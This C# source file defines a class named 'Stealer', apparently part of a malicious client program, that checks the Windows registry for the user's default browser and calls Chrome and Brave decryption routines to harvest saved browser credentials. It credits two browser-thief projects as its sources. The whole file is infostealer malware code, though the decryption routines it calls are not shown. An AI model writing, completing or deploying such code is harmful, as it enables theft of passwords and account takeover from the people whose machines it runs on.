using Client_side.StealerUtils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client_side
{
    internal class Stealer
    {
        // Source:
        // https://github.com/LimerBoy/FireFox-Thief/
        // https://github.com/simpleperson123/ChromeDecryptor/

        private static readonly string[] SupportedBrowser =
        {
            "Google Chrome",
            "Microsoft Edge",
            "Brave Browser",
        };

        private static int IdentifyUserBrowser()
        {
            // Identify the default browser
            string reg_key = @"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Associations\URLAssociations\http\UserChoice";
            string defaultBrowser = (string)Microsoft.Win32.Registry.GetValue(reg_key, "Progid", null);
            if (defaultBrowser.Contains("chrome"))
            {
                return 1;
            }
            else if (defaultBrowser.Contains("msedge"))
            {
                return 2;
            }
            else if (defaultBrowser.Contains("brave") || defaultBrowser.Contains("Brave"))
            {
                return 3;
            }
            return 0;
        }

        public static List<string> GetCredentials()
        {
            List<string> credentials = new();
            switch (IdentifyUserBrowser())
            {
                case 1:
                    {
                        credentials = ChromeDecrypt.MainFunction();
                        break;
                    }
                case 2:
                    break;
                case 3:
                    {
                        credentials = BraveDecrypt.MainFunction();
                        break;
                    }
                default:
                    {
                        return new List<string> { Encryptor.ConvertStr("Browser not supported!") };
                    }
            }
            return credentials;
        }


    }
}
